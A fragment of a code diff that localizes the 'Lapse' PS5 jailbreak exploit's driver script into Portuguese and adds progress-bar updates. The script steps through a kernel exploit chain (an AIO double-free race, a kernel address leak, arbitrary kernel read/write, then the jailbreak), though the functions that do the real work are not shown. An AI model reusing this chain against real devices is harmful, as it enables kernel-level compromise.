+            send_notification("Firmware não suportado " + FW_VERSION);
             return;
         }
         
         if(is_jailbroken()) {
-            await log("Already Jailbroken");
-            send_notification("Already Jailbroken");
+            await log("Já possui jailbreak");
+            send_notification("Já possui jailbreak");
             return;
         }
         
         failcheck_path = "/" + get_nidpath() + "/common_temp/lapse.fail";
 
         if(file_exists(failcheck_path)) {
-            await log("Restart your PS5 to run Lapse again");
-            send_notification("Restart your PS5 to run Lapse again");
+            await log("Reinicie seu PS5 para executar o Lapse novamente");
+            send_notification("Reinicie seu PS5 para executar o Lapse novamente");
             return;
         }
         
         write_file(failcheck_path, "");
         
-        await log("\n=== STAGE 0: Setup ===");
+        if (typeof updateProgress === "function") updateProgress(10);
+        await log("\n=== ESTÁGIO 0: Configuração ===");
         const setup_success = await setup();
         if (!setup_success) {
-            await log("Setup failed");
+            await log("Falha na configuração");
             return;
         }
         
-        await log("Setup completed");
+        await log("Configuração concluída");
             
         try {
-            await log("\n=== STAGE 1: Double-free AIO ===");
+            if (typeof updateProgress === "function") updateProgress(25);
+            await log("\n=== ESTÁGIO 1: Double-free AIO ===");
             const sd_pair = await double_free_reqs2();
             if (sd_pair === null) {
-                await log("Stage 1 race condition failed");
+                await log("Estágio 1: falha na condição de race");
                 await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await log("Exploit falhou - reinicie e tente novamente");
+                send_notification("Exploit falhou - reinicie e tente novamente");
                 return;
             }
-            await log("Stage 1 completed");
+            await log("Estágio 1 concluído");
             
-            await log("\n=== STAGE 2: Leak kernel addresses ===");
+            if (typeof updateProgress === "function") updateProgress(40);
+            await log("\n=== ESTÁGIO 2: Vazamento de endereços do kernel ===");
             const leak_result = await leak_kernel_addrs(sd_pair, sds);
             if (leak_result === null) {
-                await log("Stage 2 kernel address leak failed");
+                await log("Estágio 2: falha no vazamento de endereços do kernel");
                 await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await log("Exploit falhou - reinicie e tente novamente");
+                send_notification("Exploit falhou - reinicie e tente novamente");
                 return;
             }
-            await log("Stage 2 completed");
+            await log("Estágio 2 concluído");
             
-            await log("Leaked addresses:");
+            await log("Endereços vazados:");
             await log("  reqs1_addr: " + toHex(leak_result.reqs1_addr));
             await log("  kbuf_addr: " + toHex(leak_result.kbuf_addr));
             await log("  kernel_addr: " + toHex(leak_result.kernel_addr));
@@ -1772,7 +1775,8 @@
             await log("  fake_reqs3_addr: " + toHex(leak_result.fake_reqs3_addr));
             await log("  aio_info_addr: " + toHex(leak_result.aio_info_addr));
     
-            await log("\n=== STAGE 3: Double free SceKernelAioRWRequest ===");
+            if (typeof updateProgress === "function") updateProgress(55);
+            await log("\n=== ESTÁGIO 3: Double free de SceKernelAioRWRequest ===");
             
             const pktopts_sds = await double_free_reqs1(
                 leak_result.reqs1_addr,
@@ -1787,17 +1791,18 @@
             syscall(SYSCALL.close, BigInt(leak_result.fake_reqs3_sd));
     
             if (pktopts_sds === null) {
-                await log("Stage 3 double free SceKernelAioRWRequest failed");
+                await log("Estágio 3: double free de SceKernelAioRWRequest falhou");
                 await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await log("Exploit falhou - reinicie e tente novamente");
+                send_notification("Exploit falhou - reinicie e tente novamente");
                 return;
             }
             
-            await log("Stage 3 completed!");
-            await log("Aliased socket pair: " + pktopts_sds[0] + ", " + pktopts_sds[1]);
+            await log("Estágio 3 concluído!");
+            await log("Par de sockets aliasado: " + pktopts_sds[0] + ", " + pktopts_sds[1]);
 
-            await log("\n=== STAGE 4: Get arbitrary kernel read/write ===");
+            if (typeof updateProgress === "function") updateProgress(70);
+            await log("\n=== ESTÁGIO 4: Obter leitura/escrita arbitrária do kernel ===");
         
             const arw_result = await make_kernel_arw(
                 pktopts_sds,
@@ -1809,36 +1814,38 @@
             );
             
             if (arw_result === null) {
-                await log("Stage 4 get arbitrary kernel read/write failed");
+                await log("Estágio 4: falha ao obter leitura/escrita arbitrária do kernel");
                 await cleanup();
-                await log("Exploit failed - Reboot and try again");
-                send_notification("Exploit failed - Reboot and try again");
+                await log("Exploit falhou - reinicie e tente novamente");
+                send_notification("Exploit falhou - reinicie e tente novamente");
                 return;
             }
             
-            await log("Stage 4 completed!");
+            await log("Estágio 4 concluído!");
             
-            await log("\n=== STAGE 5: PS5 Jailbreak===");
+            if (typeof updateProgress === "function") updateProgress(85);
+            await log("\n=== ESTÁGIO 5: Jailbreak do PS5 ===");
             
             await ps5_jailbreak();
-            await log("Stage 5 completed!");
+            await log("Estágio 5 concluído!");
             
             await cleanup();
             
-            await log("Lapse finished");
-            send_notification("Lapse finished");
+            if (typeof updateProgress === "function") updateProgress(100);
+            await log("Lapse finalizado");
+            send_notification("Lapse finalizado");
             
             kill_youtube();
             
         } catch (e) {
-            await log("Lapse error: " + e.message);
+            await log("Erro no Lapse: " + e.message);
             await log(e.stack);
             
             await cleanup();
         }
         
     } catch (e) {
-        await log("Lapse error: " + e.message);
+        await log("Erro no Lapse: " + e.message);
         await log(e.stack);
     }
 })();
